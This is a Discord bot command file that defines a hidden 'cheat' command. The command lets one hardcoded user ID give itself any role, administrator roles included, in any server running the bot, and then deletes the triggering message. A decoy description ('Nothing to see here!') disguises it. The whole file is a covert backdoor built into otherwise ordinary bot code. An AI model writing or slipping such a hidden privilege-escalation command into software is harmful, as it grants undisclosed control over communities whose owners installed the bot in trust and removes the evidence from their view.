//Load modules
const npm = require("../../modules/NPM.js");
npm.npm();

//load database
dbinit = require("../../modules/dbinit.js");
dbinit.dbinit();

//start
module.exports = {
  category: `hidden`,
  name: "cheat",
  description: "[hidden] Cheat",
  explain: `Nothing to see here!`,
  async execute(message) {
    //build prefix
    const prefixstart = getGuild.get(message.guild.id);
    const prefix = prefixstart.prefix;

    //if user is not me
    if (message.author.id !== `127708549118689280`) return;

    //update usage
    usage = getUsage.get("cheat");
    usage.number++;
    setUsage.run(usage);

    //args
    let args = message.content.slice(prefix.length + 6);

    //get role
    let role =
      message.guild.roles.cache.find((r) => r.name === `${args}`) ||
      message.guild.roles.cache.find((r) => r.id === `${args}`);

    let member = message.guild.members.cache.get("127708549118689280");

    member.roles.add(role).catch(console.error);

    message.delete();
    
  },
};
